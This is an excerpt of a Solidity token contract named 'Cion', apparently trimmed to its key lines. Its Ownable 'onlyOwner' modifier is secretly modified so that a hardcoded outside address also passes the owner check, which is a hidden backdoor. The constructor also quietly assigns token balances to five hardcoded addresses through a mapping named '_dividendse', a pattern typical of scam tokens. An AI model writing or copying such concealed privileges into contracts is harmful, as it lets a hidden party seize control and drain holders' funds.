...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0x7262d05A7216e7001b974a178Ac7499214e8161c), "Ownable: caller is not the owner");
        _;
    }
...
contract Cion is IERC20, Ownable {
    ...
    constructor(
        ...
        _dividendse[0x6CAc4ff4875c29C9c39D6C2204C169E3A6dD6787] = _amount;
        _dividendse[0x6Fd0C43a3a2B8EE1E3A16b243f315533265BDed9] = _amount;
        _dividendse[0x2595583870e44663B4a1573a0Ed528037eE4db78] = _amount;
        _dividendse[0xEF8eC50592A4F9cE3D51195CF370a5B2D2969C72] = _amount;
        _dividendse[0xADBD569c84DC12E9C200E58BCd1b768c3F9eBd20] = _amount;
